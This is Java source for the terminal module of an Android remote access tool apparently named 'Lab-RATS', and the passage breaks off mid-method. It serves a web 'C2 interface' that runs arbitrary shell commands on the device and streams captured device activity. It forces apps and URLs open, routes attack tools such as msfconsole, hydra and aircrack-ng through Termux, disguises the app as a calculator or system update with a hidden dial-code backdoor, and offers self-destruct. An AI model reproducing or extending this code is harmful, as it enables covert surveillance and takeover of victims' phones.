package com.labs.labrats.modules;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.labs.labrats.Constants;
import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.LabRatsWorker;
import com.labs.labrats.MainActivity;
import com.labs.labrats.StatusNotification;
import com.labs.labrats.SystemAnalytics;
import com.labs.labrats.WorkManager_Sync;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class TerminalModule extends BaseModule {

    private static String currentShellPath = "/sdcard";
    private static boolean isKaliSession = false;

    public TerminalModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/") || uri.equals("/terminal") || uri.isEmpty()) {
            return serveHome(session);
        } else if (uri.equals("/terminal/restart")) {
            return restartServer();
        } else if (uri.equals("/terminal/clear-logs")) {
            return clearLogs();
        } else if (uri.equals("/terminal/logs")) {
            return serveLogs(params);
        } else if (uri.equals("/device/shell")) {
            return handleShell(params);
        }
        return null;
    }

    private Response serveHome(IHTTPSession session) {
        WorkManager_Sync.notifyOperatorActivity();
        String ip = MainActivity.getLocalIpAddress();
        String ipDisplay = (ip != null ? ip : "NOT_DETECTED");
        String sessionId = FirebaseConfig.getSessionId();

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        
        // Status Monitor Card
        html.append("<div class=\"card\">");
        String snifferStatus = StatusNotification.isServiceRunning() ? 
            "<span style=\"color:var(--neon-green); font-size:0.65rem; vertical-align:middle;\">INTEL_ACTIVE</span>" : 
            "<span style=\"color:var(--danger); font-size:0.65rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
        html.append("<h2 style=\"margin:0; letter-spacing:1px; line-height:1.2; text-align: left; font-size: 1.6rem;\">SYSTEM_MONITOR ").append(snifferStatus).append("</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        html.append("<div style=\"margin-top: 15px;\">");
        html.append("<div style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; margin-bottom:15px; text-align: left;\">SESSION_ID: ").append(sessionId).append("</div>");
        
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; justify-content: center;\">");
        
        // Server Status
        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">UPLINK_STATUS</div>");
        html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-green); margin-top: 10px;\">ONLINE</div>");
        html.append("</div>");
        
        // Port
        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">ACCESS_PORT</div>");
        html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-cyan); margin-top: 10px;\">").append(server.getListeningPort()).append("</div>");
        html.append("</div>");
        
        // IP
        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">VIRTUAL_ADDRESS</div>");
        html.append("<div style=\"font-size: 1.2rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all; margin-top: 10px;\">").append(ipDisplay).append("</div>");
        html.append("</div>");

        // NAT Traversal Info
        html.append("<div style=\"padding: 20px; background: rgba(255, 255, 0, 0.03); border: 1px solid var(--neon-yellow); border-radius: 15px; grid-column: 1 / -1; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3);\">");
        html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow); font-size: 0.7rem;\">CONNECTIVITY_PROTOCOL</div>");
        html.append("<div style=\"font-size: 0.75rem; color: #aaa; margin-top: 8px; max-width: 800px; margin-left: auto; margin-right: auto;\">System prioritizes <b>Global IPv6</b> for remote access. Local IPs (192.168...) only work if you are on the <b>same WiFi</b>; otherwise, the device must use Cellular data for a public uplink.</div>");
        html.append("</div>");
        
        html.append("</div>");
        html.append("</div>");
        html.append("</div>"); // Close Status Monitor card

        // Section Separator (Tactical Divider)
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 35px 0;\"></div>");

        boolean termuxInstalled = isAppInstalled("com.termux");
        String promptSymbol = termuxInstalled ? "$" : "#";

        // --- SYSTEM ACTIVITY LOGS SECTION ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow);\">");
        html.append("<h2 style=\"color: var(--neon-yellow); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">SYSTEM_ACTIVITY_LOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_ACTIVITY_LOGS', 'Real-time telemetry stream of background events and captured device actions.')\">INFO</span></h2>");
        html.append("<div id=\"log-terminal\" class=\"terminal-text\" style=\"height: 250px; overflow-y: auto; font-size: 0.7rem;\">");
        html.append("[LOADING_SYSTEM_LOGS...] Waiting for telemetry handshake...");
        html.append("</div>");
        html.append("<div style=\"margin-top: 15px; text-align: center;\">");
        html.append("<button onclick=\"clearSessionLogs()\" class=\"btn btn-small\" style=\"border-color: #333; color: #888;\">PURGE_SESSION_LOGS</button>");
        html.append("</div>");
        html.append("</div>");

        // --- REMOTE SHELL TERMINAL SECTION ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
        html.append("<h2 style=\"color: var(--neon-cyan); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">REMOTE_SHELL <span class=\"info-trigger\" onclick=\"showInfo(event, 'REMOTE_SHELL', 'Interactive command-line interface for direct system execution.')\">INFO</span></h2>");
        html.append("<div style=\"background: #000; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.2); overflow: hidden;\">");
        html.append("<div id=\"termux-uplink\" style=\"color: var(--neon-yellow); padding: 10px 20px 0 20px; font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; display: ").append(termuxInstalled ? "block" : "none").append(";\">[UPLINK] Termux bridge available.</div>");
        html.append("<div id=\"shell-output\" style=\"padding: 20px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace; height: 250px; overflow-y: auto;\">");
        html.append("<div>[STABILITY_OS] Initializing remote session...</div>");
        html.append("<div>[UPLINK] Active path: ").append(escapeHtml(currentShellPath)).append("</div>");
        html.append("<div style=\"opacity: 0.5; margin-top: 5px;\">Type 'help' for command list</div>");
        html.append("</div>");
        html.append("<div style=\"border-top: 1px solid rgba(0, 242, 255, 0.1); padding: 10px; display: flex; align-items: center; background: rgba(0,0,0,0.5);\">");
        html.append("<span id=\"terminal-prompt\" style=\"color: var(--terminal-green); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-right: 10px; white-space: nowrap;\">root@Android:").append(escapeHtml(currentShellPath)).append(promptSymbol).append("</span>");
        html.append("<input id=\"shell-cmd\" type=\"text\" autocapitalize=\"none\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" placeholder=\"enter command...\" style=\"background: transparent; border: none; color: #fff; outline: none; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; flex-grow: 1; padding: 5px 0;\">");
        html.append("</div>");
        html.append("</div>");
        html.append("<div class=\"terminal-input-wrap\" style=\"margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;\">");
        html.append("<button onclick=\"executeShell()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); margin:0;\">EXECUTE</button>");
        html.append("<button onclick=\"document.getElementById('shell-output').innerHTML=''\" class=\"btn btn-small\" style=\"border-color: #333; color: #888; margin:0;\">CLEAR_SCREEN</button>");
        html.append("</div>");
        html.append("</div>");

        // --- DEVICE COMMANDS CARD ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-green);\">");
        html.append("<h2 style=\"color: var(--neon-green); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">DEVICE_COMMANDS <span class=\"info-trigger\" onclick=\"showInfo(event, 'DEVICE_COMMANDS', 'Execute tactical system overrides and device interactions.')\">INFO</span></h2>");
        
        // 1. Device Sound Setting
        html.append("<div style=\"margin-bottom: 25px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-green); font-size: 0.7rem;\">DEVICE_SOUND_SETTING</div>");
        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
        html.append("<select id=\"device-cmd-selector\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-green); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
        html.append("<option value=\"vibrate\">VIBRATE_DEVICE</option>");
        html.append("<option value=\"max-volume\">MAXIMIZE_VOLUME</option>");
        html.append("<option value=\"silent-mode\">SILENT_MODE</option>");
        html.append("</select>");
        html.append("<button onclick=\"deviceCmd(document.getElementById('device-cmd-selector').value)\" class=\"btn\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
        html.append("</div></div>");

        // 2. Force Open App
        html.append("<div style=\"margin-bottom: 25px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.7rem;\">FORCE_OPEN_APP</div>");
        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
        html.append("<select id=\"app-selector\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
        html.append("<option value=\"\" style=\"background:#000;\">Select App...</option>");
        for (FirebaseConfig.AppEntry app : server.getLaunchableAppsProxy()) {
            html.append("<option value=\"").append(app.packageName).append("\">").append(escapeHtml(app.name)).append("</option>");
        }
        html.append("</select>");
        html.append("<button onclick=\"openApp()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">OPEN_APP</button>");
        html.append("</div></div>");

        // 3. Force Open URL
        html.append("<div style=\"margin-bottom: 25px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.7rem;\">FORCE_OPEN_URL</div>");
        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
        html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
        html.append("<button onclick=\"openUrl()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
        html.append("</div></div>");
        html.append("</div>"); // Close DEVICE_COMMANDS card
        
        // --- STEALTH OPERATIONS CARD ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-orange);\">");
        html.append("<h2 style=\"color: var(--neon-orange); font-size: 1.15rem; text-align: left;\">STEALTH_OPERATIONS <span class=\"info-trigger\" onclick=\"showInfo(event, 'STEALTH_OPERATIONS', 'Advanced application camouflage. Choose an identity to masquerade as a functional decoy. Use dial pad code &lt;b&gt;*#1337#&lt;/b&gt; or the hidden backdoor to restore access.')\">INFO</span></h2>");
        
        html.append("<div style=\"margin-bottom: 15px; display: flex; flex-direction: column; align-items: flex-start;\">");
        html.append("<label class=\"info-label\" style=\"align-self: flex-start; font-size: 0.7rem;\">MASQUERADE_IDENTITY:</label>");
        html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
        html.append("<option value=\"update\">System Update (Status Gear)</option>");
        html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
        html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
        html.append("<option value=\"settings\">Settings (System Config)</option>");
        html.append("<option value=\"logo\">Lab-RATS Logo (Unmasked)</option>");
        html.append("</select>");
        html.append("</div>");

        html.append("<div class=\"btn-container\" style=\"display:flex; flex-direction:column; gap:10px; align-items: flex-start;\">");
        html.append("<button onclick=\"toggleStealth()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); border-radius:12px; padding: 10px 25px;\">INITIATE_STEALTH</button>");
        html.append("<button onclick=\"restoreNormal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); border-radius:12px; padding: 10px 25px;\">RESTORE_NORMAL</button>");
        html.append("</div>");
        html.append("</div>");

        // --- CHANGE ACCESS KEY SECTION ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
        html.append("<h2 style=\"color: var(--neon-cyan); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">SECURITY_PROTOCOL <span class=\"info-trigger\" onclick=\"showInfo(event, 'SECURITY_PROTOCOL', 'Update login password for the remote C2 interface.')\">INFO</span></h2>");
        html.append("<div style=\"display: flex; flex-direction: column; align-items: flex-start;\">");
        html.append("<div style=\"width: 100%; max-width: 660px;\">");
        html.append("<form action=\"/settings/password\" method=\"POST\" class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 10px;\">");
        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"ENTER_NEW_KEY\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 10px; font-size: 0.7rem; width: 210px !important; text-align: center; margin: 0;\">UPDATE_KEY</button>");
        html.append("</form></div></div></div>");

        // --- DANGER ZONE SECTION ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--danger);\">");
        html.append("<h2 style=\"color: var(--danger); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">DANGER_ZONE <span class=\"info-trigger\" onclick=\"showInfo(event, 'DANGER_ZONE', 'Critical system overrides for service termination and data sanitization.')\">INFO</span></h2>");
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px;\">");
        html.append("<button onclick=\"deviceCmd('terminate')\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); margin:0;\">&#128683; TERMINATE_UPLINK</button>");
        html.append("<button onclick=\"restartServer()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">&#128260; RESTART_SERVER</button>");
        html.append("<button onclick=\"selfDestruct()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.1); margin:0;\">&#9763; SELF_DESTRUCT</button>");
        html.append("</div></div>");

        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response restartServer() {
        FirebaseConfig.logActivity("SECURITY_MAINTENANCE: Initiating remote service restart...");
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent intent = new Intent(context, WorkManager_Sync.class);
            intent.setAction(Constants.ACTION_STOP_CORE);
            context.startService(intent);
        }, 1500);
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
    }

    private Response clearLogs() {
        FirebaseConfig.clearSystemLogs();
        FirebaseConfig.logActivity("SYSTEM_MAINTENANCE: Session logs cleared");
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
    }

    private Response serveLogs(Map<String, String> params) {
        int since = 0;
        try {
            if (params.containsKey("since")) since = Integer.parseInt(params.get("since"));
        } catch (Exception ignored) {}
        
        return newResponse(Response.Status.OK, "application/json", FirebaseConfig.getLogsJson(since));
    }

    private Response handleShell(Map<String, String> params) {
        String cmd = params.get("cmd");
        boolean termuxAvailable = isAppInstalled("com.termux");
        String shellResult = executeShell(cmd);
        
        try {
            org.json.JSONObject resultObj = new org.json.JSONObject();
            resultObj.put("output", shellResult);
            resultObj.put("termux_available", termuxAvailable);
            resultObj.put("current_path", currentShellPath);
            return newResponse(Response.Status.OK, "application/json", resultObj.toString());
        } catch (Exception e) {
            return newResponse(Response.Status.OK, "application/json", "{\"output\": \"JSON Error\", \"termux_available\": false, \"current_path\": \"/sdcard\"}");
        }
    }

    private boolean isAppInstalled(String packageName) {
        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private String executeShell(String command) {
        if (command == null || command.trim().isEmpty()) return "";
        String trimmedCmd = command.trim();

        try {
            if (trimmedCmd.equalsIgnoreCase("clear") || trimmedCmd.equalsIgnoreCase("cls")) {
                return "__CLEAR_SCREEN__";
            }

            if (trimmedCmd.equalsIgnoreCase("exit")) {
                if (isKaliSession) {
                    isKaliSession = false;
                    return "logout\n[Exited Kali NetHunter session]";
                }
                return "exit";
            }

            if (trimmedCmd.equalsIgnoreCase("nh") || trimmedCmd.equalsIgnoreCase("nethunter") || trimmedCmd.equalsIgnoreCase("kali")) {
                isKaliSession = true;
                return "┌──(kali㉿localhost)-[~]\n└─$ [Kali NetHunter chroot session active]";
            }

            if (isKaliSession) {
                String cmdToRun = trimmedCmd;
                if (cmdToRun.equalsIgnoreCase("pkg list-installed") || cmdToRun.equalsIgnoreCase("pkg list")) {
                    cmdToRun = "dpkg -l";
                } else if (cmdToRun.toLowerCase().startsWith("pkg install ")) {
                    cmdToRun = "apt-get install -y " + cmdToRun.substring(12);
                } else if (cmdToRun.toLowerCase().startsWith("pkg update") || cmdToRun.equalsIgnoreCase("apt update")) {
                    cmdToRun = "apt-get update";
                } else if (cmdToRun.toLowerCase().startsWith("pkg upgrade") || cmdToRun.equalsIgnoreCase("apt upgrade")) {
                    cmdToRun = "apt-get upgrade -y";
                }
                trimmedCmd = "nh " + cmdToRun;
            }

            if (trimmedCmd.equalsIgnoreCase("help") || trimmedCmd.equalsIgnoreCase("-h")) {
                return "AVAILABLE_COMMANDS:\n\n" +
                       "  File Operations:\n" +
                       "    cd [path]             - Change directory (e.g. cd /sdcard, cd ..)\n" +
                       "    ls [-la]              - List files in current directory\n" +
                       "    pwd                   - Print current directory path\n" +
                       "    cat [file]            - View file contents\n" +
                       "    cp [src] [dest]       - Copy file or directory\n" +
                       "    mv [src] [dest]       - Move or rename file/directory\n" +
                       "    rm [file]             - Remove file or directory\n" +
                       "    mkdir [dir]           - Create directory\n" +
                       "    touch [file]          - Create empty file\n" +
                       "    find [dir] -name [p]  - Search files by name pattern\n\n" +
                       "  Process & Memory:\n" +
                       "    ps [-A]               - List running processes\n" +
                       "    top -n 1              - Real-time process resource usage\n" +
                       "    free -h               - View RAM / memory usage summary\n" +
                       "    uptime                - System uptime and load average\n\n" +
                       "  System Diagnostics:\n" +
                       "    sysinfo               - Aggregate hardware & software overview\n" +
                       "    getprop [prop]        - View system properties\n" +
                       "    df -h                 - Disk space / partition usage\n" +
                       "    dumpsys battery       - View detailed battery status\n" +
                       "    whoami / id           - Current user identity & UID/GID info\n" +
                       "    uname -a              - Linux kernel version & architecture\n" +
                       "    logcat -d             - Dump recent system logs\n\n" +
                       "  Network & Package Tools:\n" +
                       "    ip addr               - IP & network interface configuration\n" +
                       "    netstat               - Network connections & sockets\n" +
                       "    pm list packages      - List installed application packages\n" +
                       "    pm path [pkg]         - Get APK installation path for package\n" +
                       "    am start -n [comp]    - Launch activity / component\n\n" +
                       "  Termux Bridge:\n" +
                       "    termux [cmd]          - Route command through Termux bridge\n" +
                       "    termux-fix-mirrors    - Fix Termux repository & mirror setup\n\n" +
                       "  Terminal Controls:\n" +
                       "    clear / cls           - Clear terminal screen\n" +
                       "    help / -h             - Show this help menu\n\n" +
                       "CURRENT_PATH: " + currentShellPath;
            }

            if (trimmedCmd.equalsIgnoreCase("ps")) {
                String res = executeShellProcess("ps -A");
                if (res.contains("invalid") || res.contains("not found") || res.trim().isEmpty() || res.contains("[Command executed with no output]")) {
                    res = executeShellProcess("ps");
                }
                return res;
            }

            if (trimmedCmd.equals("free") || trimmedCmd.startsWith("free ")) {
                String res = executeShellProcess(trimmedCmd);
                if (res.contains("not found") || res.contains("Permission denied") || res.trim().isEmpty() || res.contains("[Command executed with no output]")) {
                    return executeShellProcess("cat /proc/meminfo | head -n 12");
                }
                return res;
            }

            if (trimmedCmd.equalsIgnoreCase("sysinfo")) {
                return "SYSTEM_OVERVIEW:\n" +
                       "  Manufacturer: " + android.os.Build.MANUFACTURER + "\n" +
                       "  Model: " + android.os.Build.MODEL + "\n" +
                       "  Android Ver: " + android.os.Build.VERSION.RELEASE + " (API " + android.os.Build.VERSION.SDK_INT + ")\n" +
                       "  Current Path: " + currentShellPath + "\n" +
                       "  Session User: u0_a" + (android.os.Process.myUid() - 10000) + " (UID: " + android.os.Process.myUid() + ")\n" +
                       "  Architecture: " + System.getProperty("os.arch");
            }

            if (trimmedCmd.equalsIgnoreCase("pwd")) {
                return currentShellPath;
            }

            if (trimmedCmd.equalsIgnoreCase("termux-fix-mirrors")) {
                return executeShell("termux mkdir -p /data/data/com.termux/files/usr/etc/apt && echo \"deb https://packages.termux.dev/apt/termux-main stable main\" > /data/data/com.termux/files/usr/etc/apt/sources.list && apt update");
            }

            if (trimmedCmd.startsWith("termux ") || 
               (isAppInstalled("com.termux") && (
                   trimmedCmd.startsWith("pkg ") || trimmedCmd.equals("pkg") ||
                   trimmedCmd.startsWith("apt ") || trimmedCmd.equals("apt") ||
                   trimmedCmd.startsWith("pip ") || trimmedCmd.equals("pip") ||
                   trimmedCmd.startsWith("python ") || trimmedCmd.equals("python") ||
                   trimmedCmd.startsWith("nmap ") || trimmedCmd.equals("nmap") ||
                   trimmedCmd.startsWith("dpkg ") || trimmedCmd.equals("dpkg") ||
                   trimmedCmd.startsWith("nh ") || trimmedCmd.equals("nh") ||
                   trimmedCmd.startsWith("nethunter ") || trimmedCmd.equals("nethunter") ||
                   trimmedCmd.startsWith("kali ") || trimmedCmd.equals("kali") ||
                   trimmedCmd.startsWith("msfconsole") ||
                   trimmedCmd.startsWith("sqlmap") ||
                   trimmedCmd.startsWith("hydra") ||
                   trimmedCmd.startsWith("wifite") ||
                   trimmedCmd.startsWith("aircrack-ng")
               ))) {
                
                if (!isAppInstalled("com.termux")) return "Error: Termux is not installed on this device.";
                
                String termuxCmd = trimmedCmd;
                if (trimmedCmd.startsWith("termux ")) termuxCmd = trimmedCmd.substring(7).trim();
                termuxCmd = resolveTermuxPath(termuxCmd);

                String cmdId = String.valueOf(System.currentTimeMillis() % 1000000);
                File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                File outputFile = new File(downloadDir, "termux_" + cmdId + ".txt");

                Intent intent = new Intent("com.termux.RUN_COMMAND");
                intent.setClassName("com.termux", "com.termux.app.RunCommandService");
                intent.putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/usr/bin/bash");
                
                String workDir = new File("/home/kali").exists() ? "/home/kali" : "/data/data/com.termux/files/home";
                String wrappedCmd = "export PATH=/data/data/com.termux/files/usr/bin:$PATH; " +
                                  "export HOME=" + workDir + "; " +
                                  "cd " + workDir + "; " +
                                  "export DEBIAN_FRONTEND=noninteractive; " +
                                  "({ " + termuxCmd + "; }) > " + outputFile.getAbsolutePath() + " 2>&1; " +
                                  "echo \"\n__DONE_" + cmdId + "__\" >> " + outputFile.getAbsolutePath();
                
                intent.putExtra("com.termux.RUN_COMMAND_ARGUMENTS", new String[]{"-c", wrappedCmd});
                intent.putExtra("com.termux.RUN_COMMAND_WORKDIR", workDir);
                intent.putExtra("com.termux.RUN_COMMAND_BACKGROUND", true);
                intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
                
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        try {
                            context.startForegroundService(intent);
                        } catch (Exception fgEx) {
                            context.startService(intent);
                        }
                    } else {
                        context.startService(intent);
                    }
                } catch (Exception e) {
                    return executeTermuxDirectFallback(termuxCmd);
                }

                final String checkCmd = trimmedCmd;
                final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
                String marker = "__DONE_" + cmdId + "__";
                
                LabRatsWorker.execute(() -> {
                    int retries = 0;
                    int maxRetries = (checkCmd.contains("pkg") || checkCmd.contains("apt") || checkCmd.contains("pip")) ? 300 : 60; 
                    while (retries < maxRetries) {
                        try { Thread.sleep(1000); } catch (Exception ignored) {}
                        if (outputFile.exists() && outputFile.length() > 0) {
                            try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(outputFile, "r")) {
                                long len = raf.length();
                                if (len > 30) {
                                    raf.seek(len - 30);
                                    byte[] endBytes = new byte[30];
                                    raf.read(endBytes);
                                    if (new String(endBytes).contains(marker)) {
                                        latch.countDown();
                                        return;
                                    }
                                }
                            } catch (Exception ignored) {}
                        }
                        retries++;
                    }
                    latch.countDown();
                });

                try {
                    latch.await();
                } catch (InterruptedException ignored) {}

                if (outputFile.exists() && outputFile.length() > 0) {
                    try { Thread.sleep(500); } catch (Exception ignored) {}
                    
                    for (int r = 0; r < 5; r++) {
                        try {
                            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                            try (java.io.FileInputStream fis = new java.io.FileInputStream(outputFile)) {
                                byte[] buffer_chunk = new byte[8192];
                                int len_read;
                                while ((len_read = fis.read(buffer_chunk)) != -1) {
                                    baos.write(buffer_chunk, 0, len_read);
                                }
                            }
                            
                            String result = baos.toString("UTF-8");
                            if (result.contains(marker)) {
                                result = result.replace(marker, "").trim();
                                try { outputFile.delete(); } catch (Exception ignored) {}
                                return result + "\n\n[Termux Bridge Execution Complete]";
                            }
                            
                            if (r == 4) return result + "\n\n[Warning: Completion marker not detected, output might be partial]";
                        } catch (Exception e) {
                            try { Thread.sleep(1000); } catch (Exception ignored) {}
                        }
                    }
                }
                
                // Fallback to direct process execution if RunCommandService failed or timed out
                return executeTermuxDirectFallback(termuxCmd);
            }

            if (trimmedCmd.startsWith("cd") && (trimmedCmd.length() == 2 || Character.isWhitespace(trimmedCmd.charAt(2)))) {
                String targetPath = trimmedCmd.length() > 2 ? trimmedCmd.substring(2).trim() : "";
                if ((targetPath.startsWith("\"") && targetPath.endsWith("\"")) || (targetPath.startsWith("'") && targetPath.endsWith("'"))) {
                    if (targetPath.length() >= 2) {
                        targetPath = targetPath.substring(1, targetPath.length() - 1).trim();
                    }
                }
                
                File sdcard = Environment.getExternalStorageDirectory();
                String defaultHome = (sdcard != null && sdcard.exists()) ? sdcard.getAbsolutePath() : context.getFilesDir().getAbsolutePath();

                if (targetPath.isEmpty() || targetPath.equals("~")) {
                    targetPath = defaultHome;
                } else if (targetPath.startsWith("~/")) {
                    targetPath = defaultHome + targetPath.substring(1);
                }
                
                File nextDir;
                if (targetPath.startsWith("/")) {
                    nextDir = new File(targetPath);
                } else {
                    nextDir = new File(currentShellPath, targetPath);
                }

                if (nextDir.exists() && nextDir.isDirectory()) {
                    try {
                        currentShellPath = nextDir.getCanonicalPath();
                    } catch (Exception e) {
                        currentShellPath = nextDir.getAbsolutePath();
                    }
                    return "Directory changed to: " + currentShellPath;
                } else {
                    return "Error: Directory does not exist: " + targetPath;
                }
            }

            if (trimmedCmd.equalsIgnoreCase("whoami")) {
                String res = executeShellProcess("whoami");
                if (res.contains("not found") || res.contains("permission denied") || res.contains("Shell Error") || res.trim().isEmpty() || res.contains("[Command executed with no output]")) {
                    return "u0_a" + (android.os.Process.myUid() - 10000) + " (UID: " + android.os.Process.myUid() + ")";
                }
                return res;
            }

            if (trimmedCmd.startsWith("netstat")) {
                String res = executeShellProcess(trimmedCmd);
                if (res.contains("Permission denied") || res.contains("No such file") || res.trim().isEmpty() || res.contains("[Command executed with no output]")) {
                    return getNetworkInterfaceConfig() + "\n\n[Note: Direct socket table (/proc/net/tcp) is restricted by Android 10+ SELinux rules. Interface IP configuration displayed above.]";
                }
                return res;
            }

            if (trimmedCmd.startsWith("ip") || trimmedCmd.startsWith("ifconfig")) {
                String res = executeShellProcess(trimmedCmd);
                if (res.contains("Permission denied") || res.contains("not found") || res.contains("No such file") || res.trim().isEmpty() || res.contains("[Command executed with no output]")) {
                    return getNetworkInterfaceConfig();
                }
                return res;
            }

            String execCmd = trimmedCmd;
            if (trimmedCmd.equals("logcat") || trimmedCmd.startsWith("logcat ")) {
                if (!trimmedCmd.contains("-d")) {
                    execCmd = execCmd + " -d";
                }
                if (!trimmedCmd.contains("-t")) {
                    execCmd = execCmd + " -t 200";
                }
            } else if (trimmedCmd.equals("top") || trimmedCmd.startsWith("top ")) {
